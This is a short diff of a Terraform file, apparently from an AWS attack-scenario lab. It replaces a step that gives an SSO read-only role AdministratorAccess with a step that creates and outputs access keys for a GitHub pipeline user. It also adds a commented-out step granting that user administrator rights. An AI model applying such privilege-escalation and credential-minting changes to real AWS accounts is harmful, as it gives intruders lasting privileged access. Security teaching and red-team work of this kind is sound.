@@ -395,11 +395,24 @@ data "aws_iam_policy_document" "access_logs" {
 }
 
 
-## Scenario 3 - Provide administrator access to an attacker-accessible role
+## Scenario 3 - Generate and output keys for github-pipeline-user
 
-# 1. Attach built-in "AdministratorAccess" policy to "DeliveryPipelinesReadOnly" role
-resource "aws_iam_role_policy_attachment" "read_only_to_admin" {
-  role       = "AWSReservedSSO_DeliveryPipelinesReadOnly_f04864ddda3ca08e"
-  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+# 1. Generate and output keys
+resource "aws_iam_access_key" "attacker" {
+  user = "github-pipeline-user"
 }
 
+output "attacker_access_key_id" {
+  value = aws_iam_access_key.attacker.id
+}
+
+output "attacker_access_key_secret" {
+  value     = aws_iam_access_key.attacker.secret
+  sensitive = true
+}
+
+# 2. Attach AdministratorAccess policy to attacker
+# resource "aws_iam_user_policy_attachment" "attacker-attach" {
+#  user       = aws_iam_user.attacker.name
+#  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+#}
